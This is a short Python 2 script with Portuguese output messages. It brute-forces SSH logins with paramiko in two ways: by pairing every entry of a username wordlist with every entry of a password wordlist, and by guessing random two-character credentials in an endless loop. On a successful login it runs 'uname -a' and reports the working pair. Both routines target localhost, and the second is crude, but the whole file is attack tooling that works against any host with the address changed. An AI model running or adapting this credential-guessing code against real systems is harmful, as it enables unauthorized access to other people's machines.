import paramiko

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

with open('user.txt','r') as u:
        for line in u:
                usrnm=line
                usrnm=usrnm.rstrip('\n')
                with open('pass.txt','r') as p:
                        for line in p:
                                psswrd=line
                                psswrd=psswrd.rstrip('\n')
                                print "Usando o seguinte usuario: %s e a seguinte senha: %s" %(usrnm,psswrd)
                                try:
                                        ssh.connect('localhost', username=usrnm, password=psswrd)
                                except paramiko.SSHException:
                                        print "Connection Failed"
                                        print "........................................\n"
                                        continue
                                stdin,stdout,stderr = ssh.exec_command("uname -a")

                                for line in stdout.readlines():
                                        print line.strip()
                                        print "Usuario encontrado!..User:%s, Pass:%s................\n" % (usrnm,psswrd)
                                        ssh.close()
import random
while True:
    try:
#        s = "abcdefghijklmnopqrstuvwxyz01234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()?"
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        s = "12"
        passlen = 2
        p =  "".join(random.sample(s,passlen ))
        t = "hw"
        u =  "".join(random.sample(t,passlen ))
        print "Usando o seguinte nome de usuario e senha : %s,%s" % (u,p)
        ssh.connect('localhost', username=u, password=p, timeout='0.1', banner_timeout='0.1')

    except paramiko.SSHException:
        print "Connection Failed"
        print "..................\n"
        ssh.close
        continue
    stdin,stdout,stderr = ssh.exec_command("uname -a")
    for line in stdout.readlines():
        print line.strip()
        print "Usuario encontrado!..User:%s, Pass:%s................\n" % (u,p)
    ssh.close()
    quit()
